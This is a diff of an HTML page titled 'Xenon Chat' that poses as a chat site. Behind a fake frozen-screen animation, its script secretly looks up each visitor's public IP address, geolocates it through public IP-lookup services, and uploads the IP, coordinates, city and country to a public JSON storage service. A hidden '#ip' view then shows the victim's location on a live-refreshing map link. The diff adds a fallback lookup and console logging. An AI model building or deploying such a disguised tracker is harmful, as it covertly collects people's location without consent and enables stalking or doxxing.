@@ -5,92 +5,23 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xenon Chat</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            background: #000;
-            color: #0f0;
-            font-family: monospace;
-            overflow: hidden;
-            cursor: default;
-        }
-        #landing {
-            position: absolute;
-            inset: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            background: #000;
-        }
-        #frozen {
-            position: absolute;
-            inset: 0;
-            display: none;
-            background: #000;
-            color: #222;
-            font-size: 1.1rem;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            line-height: 1.8;
-            white-space: pre;
-            user-select: none;
-            pointer-events: none;
-        }
-        .glitch {
-            color: #0f0;
-            font-size: 4.5rem;
-            letter-spacing: 12px;
-            animation: glitch 4s infinite;
-            text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f;
-        }
-        @keyframes glitch {
-            0%,100% { text-shadow: 0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
-            20% { text-shadow: -0.05em -0.025em 0 #f00, 0.025em 0.035em 0 #0ff, -0.05em -0.05em 0 #f0f; }
-            40% { text-shadow: 0.05em 0.035em 0 #f00, 0.03em 0 0 #0ff, 0 0.08em 0 #f0f; }
-        }
-        button.enter {
-            margin-top: 80px;
-            background: transparent;
-            border: 2px solid #0f0;
-            color: #0f0;
-            font-size: 2.2rem;
-            padding: 20px 60px;
-            font-family: monospace;
-            cursor: pointer;
-            transition: all 0.4s;
-            letter-spacing: 4px;
-        }
-        button.enter:hover {
-            background: #0f0;
-            color: #000;
-            box-shadow: 0 0 40px #0f08;
-        }
-        #frozen p { margin: 8px 0; opacity: 0.7; }
-        .blink { animation: blink 1.2s step-end infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        #ip-view {
-            position: absolute;
-            inset: 0;
-            background: #000;
-            color: #0f0;
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            box-sizing: border-box;
-            font-size: 1.8rem;
-            text-align: center;
-        }
-        #ip-display { font-size: 3rem; letter-spacing: 3px; margin: 20px 0; word-break: break-all; max-width: 90%; }
-        #geo { font-size: 2rem; color: #0f8; margin: 20px 0; }
-        #maplink { font-size: 1.6rem; color: #0ff; margin: 40px 0; text-decoration: none; }
-        #maplink:hover { text-decoration: underline; }
-        #status { font-size: 1.2rem; color: #555; margin-top: 60px; }
+        body, html { margin:0; padding:0; height:100%; background:#000; color:#0f0; font-family:monospace; overflow:hidden; cursor:default; }
+        #landing { position:absolute; inset:0; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; background:#000; }
+        #frozen { position:absolute; inset:0; display:none; background:#000; color:#222; font-size:1.1rem; justify-content:center; align-items:center; flex-direction:column; line-height:1.8; white-space:pre; user-select:none; pointer-events:none; }
+        .glitch { color:#0f0; font-size:4.5rem; letter-spacing:12px; animation:glitch 4s infinite; text-shadow:0.05em 0 0 #f00, -0.03em -0.04em 0 #0ff, 0.025em 0.04em 0 #f0f; }
+        @keyframes glitch { 0%,100% {text-shadow:0.05em 0 0 #f00,-0.03em -0.04em 0 #0ff,0.025em 0.04em 0 #f0f;} 20% {text-shadow:-0.05em -0.025em 0 #f00,0.025em 0.035em 0 #0ff,-0.05em -0.05em 0 #f0f;} 40% {text-shadow:0.05em 0.035em 0 #f00,0.03em 0 0 #0ff,0 0.08em 0 #f0f;} }
+        button.enter { margin-top:80px; background:transparent; border:2px solid #0f0; color:#0f0; font-size:2.2rem; padding:20px 60px; font-family:monospace; cursor:pointer; transition:all 0.4s; letter-spacing:4px; }
+        button.enter:hover { background:#0f0; color:#000; box-shadow:0 0 40px #0f08; }
+        #frozen p { margin:8px 0; opacity:0.7; }
+        .blink { animation:blink 1.2s step-end infinite; }
+        @keyframes blink { 50% {opacity:0;} }
+        #ip-view { position:absolute; inset:0; background:#000; color:#0f0; display:none; flex-direction:column; justify-content:center; align-items:center; padding:20px; box-sizing:border-box; font-size:1.8rem; text-align:center; }
+        #ip-display { font-size:3rem; letter-spacing:3px; margin:20px 0; word-break:break-all; max-width:90%; }
+        #geo { font-size:2rem; color:#0f8; margin:20px 0; }
+        #maplink { font-size:1.6rem; color:#0ff; margin:40px 0; text-decoration:none; }
+        #maplink:hover { text-decoration:underline; }
+        #status { font-size:1.2rem; color:#555; margin-top:60px; }
+        #hint { position:fixed; bottom:10px; right:10px; font-size:0.7rem; color:#444; opacity:0.4; pointer-events:none; }
     </style>
 </head>
 <body>
@@ -109,6 +40,7 @@
         <p>█▓▓▓▓▓░░░░░░░░░░  0xDEADBEEF overflow</p>
         <p style="margin-top:60px; font-size:1.4rem; color:#0f0;">connecting to shared shadow node...</p>
         <p style="font-size:0.9rem; opacity:0.5;">(do not close this window - data sync in background)</p>
+        <div id="hint">F12 → Console for room/debug</div>
     </div>
 
     <div id="ip-view">
@@ -120,86 +52,105 @@
     </div>
 
     <script>
+        // Public JSON basket service - no auth, free, works from hosted pages
         const PANTRY_BASE = "https://getpantry.cloud/apiv1/pantry/";
         let ROOM = localStorage.getItem("xenon_room") || "";
 
         if (!ROOM) {
-            ROOM = "xenon-" + Math.random().toString(36).substr(2, 6);
+            ROOM = "xenon-" + Math.random().toString(36).slice(2, 8);
             localStorage.setItem("xenon_room", ROOM);
         }
+        console.log("%cRoom code (share this to sync devices): " + ROOM, "color:#0f0; font-size:16px;");
 
         function enterXenon() {
             document.getElementById("landing").style.display = "none";
             document.getElementById("frozen").style.display = "flex";
-
-            setTimeout(() => {
-                captureAndUpload();
-            }, 12000);  // fake delay for "frozen" feel
+            setTimeout(captureAndUpload, 12000); // fake freeze
         }
 
         async function captureAndUpload() {
             try {
+                console.log("Capturing IP...");
                 const ipRes = await fetch("https://api.ipify.org?format=json");
                 const { ip } = await ipRes.json();
+                console.log("IP:", ip);
 
-                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                const geo = await geoRes.json();
+                let geo = {};
+                try {
+                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                    geo = await geoRes.json();
+                } catch {}
+                if (geo.error) {
+                    const fallback = await fetch(`https://ip-api.com/json/${ip}`);
+                    geo = await fallback.json();
+                }
 
-                if (!geo.error) {
+                if (!geo.error && geo.status !== "fail") {
                     const geoData = {
-                        lat: geo.latitude,
-                        lon: geo.longitude,
-                        city: geo.city || geo.region || "?",
-                        country: geo.country_name || "?"
+                        lat: geo.lat || geo.latitude,
+                        lon: geo.lon || geo.longitude,
+                        city: geo.city || geo.regionName || "?",
+                        country: geo.country || geo.countryName || "?"
                     };
-                    await fetch(PANTRY_BASE + ROOM, {
+                    console.log("Geo:", geoData);
+
+                    const res = await fetch(PANTRY_BASE + ROOM, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ ip, geo: geoData, ts: Date.now() })
                     });
+                    if (res.ok) console.log("Data sent to server!");
+                    else console.error("Upload failed:", res.status);
                 }
-            } catch (e) {}
+            } catch (e) {
+                console.error("Capture error:", e);
+            }
         }
 
         async function showIpView() {
             document.getElementById("landing").style.display = "none";
             document.getElementById("frozen").style.display = "none";
-            const view = document.getElementById("ip-view");
-            view.style.display = "flex";
+            document.getElementById("ip-view").style.display = "flex";
 
             const ipEl = document.getElementById("ip-display");
             const geoEl = document.getElementById("geo");
             const mapEl = document.getElementById("maplink");
             const status = document.getElementById("status");
 
-            try {
-                const res = await fetch(PANTRY_BASE + ROOM);
-                if (!res.ok) throw new Error();
-                const data = await res.json();
+            const update = async () => {
+                try {
+                    console.log("Fetching from server...");
+                    const res = await fetch(PANTRY_BASE + ROOM);
+                    if (!res.ok) throw new Error(res.status);
+                    const data = await res.json();
 
-                if (data.ip) {
-                    ipEl.textContent = data.ip;
-                    const g = data.geo || {};
-                    geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;
-                    if (g.lat && g.lon) {
-                        mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
-                        mapEl.style.display = "block";
+                    if (data.ip) {
+                        ipEl.textContent = data.ip;
+                        const g = data.geo || {};
+                        geoEl.innerHTML = `${g.city || "?"} • ${g.country || "?"}<br>${(g.lat||0).toFixed(6)}, ${(g.lon||0).toFixed(6)}`;
+                        if (g.lat && g.lon) {
+                            mapEl.href = `https://www.openstreetmap.org/?mlat=${g.lat}&mlon=${g.lon}#map=15/${g.lat}/${g.lon}`;
+                            mapEl.style.display = "block";
+                        }
+                        status.textContent = `Room: ${ROOM} • Last capture: ${new Date(data.ts).toLocaleString()}`;
+                        console.log("Data loaded:", data);
+                    } else {
+                        ipEl.textContent = "NO DATA YET";
+                        status.textContent = "No capture in this room";
                     }
-                    status.textContent = `room: ${ROOM} • captured: ${new Date(data.ts).toLocaleString()}`;
-                } else {
-                    ipEl.textContent = "NO DATA YET";
-                    status.textContent = "no capture in this room";
+                } catch (e) {
+                    ipEl.textContent = "FETCH ERROR";
+                    status.textContent = "Could not reach server (check console)";
+                    console.error("Fetch failed:", e);
                 }
-            } catch (e) {
-                ipEl.textContent = "FETCH ERROR";
-                status.textContent = "could not load data";
-            }
+            };
+
+            await update();
+            setInterval(update, 10000); // live refresh
         }
 
         function checkHash() {
-            if (location.hash === "#ip") {
-                showIpView();
-            }
+            if (location.hash === "#ip") showIpView();
         }
 
         window.addEventListener("hashchange", checkHash);
